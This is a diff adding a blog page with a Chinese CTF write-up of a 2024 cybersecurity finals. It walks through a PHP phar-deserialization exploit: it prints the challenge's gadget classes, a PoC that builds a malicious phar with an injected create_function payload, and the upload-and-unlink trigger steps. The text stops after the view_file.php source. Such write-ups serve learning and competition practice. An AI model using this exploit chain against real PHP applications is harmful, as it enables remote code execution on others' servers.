@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="这次整个比赛没拿到奖，自己负主要责任。其实就差一道题了，web方向的sql注入没做出来。可惜的同时也感受到了自己的菜。还是要多练习啊。。。老本吃不了了。 但是比赛就是这样，你觉得自己差一道，可能人家也觉得自己差一道。所以硬实力才是最重要的。 复现一下：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024集团网络安全攻防赛决赛复现">
+<meta property="og:url" content="http://example.com/2024/10/21/2024%E9%9B%86%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9B%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="My0n9s&#39;blog">
+<meta property="og:description" content="这次整个比赛没拿到奖，自己负主要责任。其实就差一道题了，web方向的sql注入没做出来。可惜的同时也感受到了自己的菜。还是要多练习啊。。。老本吃不了了。 但是比赛就是这样，你觉得自己差一道，可能人家也觉得自己差一道。所以硬实力才是最重要的。 复现一下：">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img.picgo.net/2024/10/22/easy_web282a3fcfc90023e63.png">
+<meta property="og:image" content="https://img.picgo.net/2024/10/22/easy_web3fbcf44bb461d342e.png">
+<meta property="og:image" content="https://img.picui.cn/free/2024/10/21/67163b3850d50.png">
+<meta property="og:image" content="https://img.picgo.net/2024/10/23/ezsmarty1ced0a1e5bf7a9ba.png">
+<meta property="article:published_time" content="2024-10-21T11:02:37.000Z">
+<meta property="article:modified_time" content="2024-10-23T13:56:41.313Z">
+<meta property="article:author" content="My0n9s">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.picgo.net/2024/10/22/easy_web282a3fcfc90023e63.png">
+
+
+<link rel="canonical" href="http://example.com/2024/10/21/2024%E9%9B%86%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9B%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2024/10/21/2024%E9%9B%86%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9B%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/","path":"2024/10/21/2024集团网络安全攻防赛决赛复现/","title":"2024集团网络安全攻防赛决赛复现"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2024集团网络安全攻防赛决赛复现 | My0n9s'blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">My0n9s'blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%A2%E9%98%9F%E8%B5%9B"><span class="nav-number">1.</span> <span class="nav-text">团队赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B1%E5%90%8C%E9%98%B2%E5%BE%A1"><span class="nav-number">1.1.</span> <span class="nav-text">共同防御</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ezweb"><span class="nav-number">1.1.1.</span> <span class="nav-text">ezweb</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">预期解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">反思</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">非预期</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#login"><span class="nav-number">1.1.2.</span> <span class="nav-text">login</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%AA%E4%BA%BA%E8%B5%9B"><span class="nav-number">2.</span> <span class="nav-text">个人赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezsmarty"><span class="nav-number">2.1.</span> <span class="nav-text">ezsmarty</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Easy-encrypt"><span class="nav-number">2.2.</span> <span class="nav-text">Easy_encrypt</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">2.2.1.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="My0n9s"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">My0n9s</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">83</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/21/2024%E9%9B%86%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9B%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="My0n9s">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2024集团网络安全攻防赛决赛复现 | My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2024集团网络安全攻防赛决赛复现
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-10-21 19:02:37" itemprop="dateCreated datePublished" datetime="2024-10-21T19:02:37+08:00">2024-10-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-10-23 21:56:41" itemprop="dateModified" datetime="2024-10-23T21:56:41+08:00">2024-10-23</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>这次整个比赛没拿到奖，自己负主要责任。其实就差一道题了，web方向的sql注入没做出来。可惜的同时也感受到了自己的菜。还是要多练习啊。。。老本吃不了了。</p>
+<p>但是比赛就是这样，你觉得自己差一道，可能人家也觉得自己差一道。所以硬实力才是最重要的。</p>
+<p>复现一下：</p>
+<span id="more"></span>
+
+<h1 id="团队赛"><a href="#团队赛" class="headerlink" title="团队赛"></a>团队赛</h1><h2 id="共同防御"><a href="#共同防御" class="headerlink" title="共同防御"></a>共同防御</h2><p>其实共同防御和<code>CTF</code>差不多，就是多了一个共享解题思路的环节，一血可以去分享解题思路然后拿附加分~~~</p>
+<h3 id="ezweb"><a href="#ezweb" class="headerlink" title="ezweb"></a>ezweb</h3><h4 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h4><p>刚开始做这个题是带上了很严重的思维定式的。给了源码，源码里面能看到反序列化相关的一些代码，首页又给了文件上传的点，所以很自然的想到了<code>phar</code>反序列化的考点。然而，只是想到了，却忘记怎么利用了。。。最熟悉的陌生人。。后来才发现我的这个思路是预期解。</p>
+<p>反序列化存在的点：<code>delete_file.php</code>，因为这个文件是包含了<code>class.php</code>的，我们审计class.php的代码可以找到一个很清晰的链子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bc0n</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$about</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;about)&#123;</span><br><span class="line">            <span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>,<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rn0g</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$echofi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;echofi-&gt;come;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">qw4e</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$nonono</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cookie</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nonono = <span class="variable">$cookie</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;nonono) &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>-&gt;nonono,<span class="string">&#x27;check&#x27;</span>) )</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;nonono-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">y3ui</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ability</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$display</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/va|file|pa|sys|exec|cat/i&quot;</span>,<span class="variable">$this</span>-&gt;ability))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hack!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;display-&gt;<span class="title function_ invoke__">come</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从类<code>qw4e</code>出发，会调用<code>destruct</code>函数，让 <code>qw4e</code>类<code>nonono属性</code>的值为<code>y3ui类</code>，就可以让<code>y3ui</code>去调用它的<code>check函数</code>，通过<code>preg_match</code>函数那里，我们将<code>this-&gt;ability</code> 赋值为<code>rn0g</code>类，那么就会调用<code>rn0g类</code>的<code>_tostring</code>函数，将<code>rn0g</code>类的<code>echofi</code>属性赋值为<code>bc0n类</code>，就会触发<code>__get</code>函数，同时我们让<code>bc0n</code>的<code>about</code>属性值为<code>True</code>，就会调用<code>creat_function</code>函数，我们通过控制<code>code</code>的值来执行恶意语句。写到这里，就非常清晰了，POC：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bc0n</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$about</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;about = True;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code=<span class="string">&quot;&#125;phpinfo();//&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rn0g</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$echofi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;echofi = <span class="keyword">new</span> <span class="title function_ invoke__">bc0n</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">qw4e</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$nonono</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nonono = <span class="keyword">new</span> <span class="title function_ invoke__">y3ui</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">y3ui</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ability</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$display</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ability = <span class="keyword">new</span> <span class="title function_ invoke__">rn0g</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="keyword">new</span> <span class="title function_ invoke__">qw4e</span>());</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;text.txt&quot;</span>,<span class="string">&quot;hello,phar!&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//生成phar核心部分</span><br><span class="line">$phar=new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata(new qw4e());</span><br><span class="line">$phar-&gt;addFromString(&quot;text.txt&quot;,&quot;hello,phar!&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<p>生成phar的这部分其实是比较固定的，需要改变的地方是<code>$phar-&gt;setMetadata(new qw4e()); </code>，这里改成我们构造好的序列化链。当然这个题是以<code>qw4e</code> 为始。本地访问这个文件，就可以得到<code>.phar</code> 格式的文件。当然你得把本地的<code>php.ini</code>的 <code>phar read only </code>改成 <code>off </code></p>
+<p>其实这里我们相当于把序列化的内容写到了<code>phar文件</code>里面，(通过<code>setMetadata()</code>)，接下来其实就是触发这里面的内容完成反序列化的过程，以往我们是通过<code>unseralize()</code> 函数，而今天我们是通过<code>phar://</code>协议。那么怎么去触发这个协议呢，刚好这里有个:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;fileName)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;fileName)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;文件 <span class="subst">$this</span>-&gt;fileName 已成功删除。&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;无法删除文件 <span class="subst">$this</span>-&gt;fileName&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件 <span class="subst">$this</span>-&gt;fileName 不存在。&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>unlink</code>函数</p>
+<p>所以完整利用链就形成了，我们把生成的<code>phar.phar</code>文件改成<code>phar.png</code>文件上传(因为文件上传这里有白名单限制。)，然后通过删除功能抓个包，修改下file参数，来触发反序列化漏洞。</p>
+<p> <img src="https://img.picgo.net/2024/10/22/easy_web282a3fcfc90023e63.png" alt="集团赛easy web2"></p>
+<p><img src="https://img.picgo.net/2024/10/22/easy_web3fbcf44bb461d342e.png" alt="集团赛easy web3"></p>
+<h4 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h4><p>这里说几个出错的地方：</p>
+<p>1.poc那里的false要改成true。原来的类里面是把值赋上去了，<strong>删掉</strong>，在构造函数里面重新赋值。</p>
+<p>2.注意<strong>php的版本</strong>，因为有个属性是private，php5和php7对应的版本生成的序列化的格式可能有稍许差别。打的时候多试试。</p>
+<p>3.注意文件的路径，这里有个坑就是，你上传成功它给的路径为<code>/var/www/html/xxxxx.png</code> ，但其实真正的路径在<code>/var/www/html/uploads/xxx.png</code> ，所以使用 <code>phar</code>协议的时候，是<code>file=phar:///var/www/html/uploads/xxx.png</code></p>
+<h4 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h4><p>团队的大佬道哥想出来的，因为给了源码，可以看到有个<code>view_file.php</code>文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$fileName</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\?|\*/&quot;</span>,<span class="variable">$fileName</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filePath</span> = <span class="string">&#x27;../uploads/&#x27;</span> . <span class="variable">$fileName</span>; <span class="comment">// 替换为您的上传目录</span></span><br><span class="line">    <span class="variable">$viewF</span> = <span class="keyword">new</span> <span class="title function_ invoke__">file</span>(<span class="variable">$filePath</span>);</span><br><span class="line">    <span class="variable">$dataUri</span> = <span class="variable">$viewF</span>-&gt;<span class="title function_ invoke__">viewfile</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;没有指定要查看的文件。&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$dataUri</span>)): <span class="meta">?&gt;</span></span><br><span class="line">        &lt;img src=<span class="string">&quot;&lt;?php echo <span class="subst">$dataUri</span>; ?&gt;&quot;</span> alt=<span class="string">&quot;Your Image&quot;</span> style=<span class="string">&quot;max-width: 100%; height: auto;&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">    &lt;p&gt;图片不存在&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
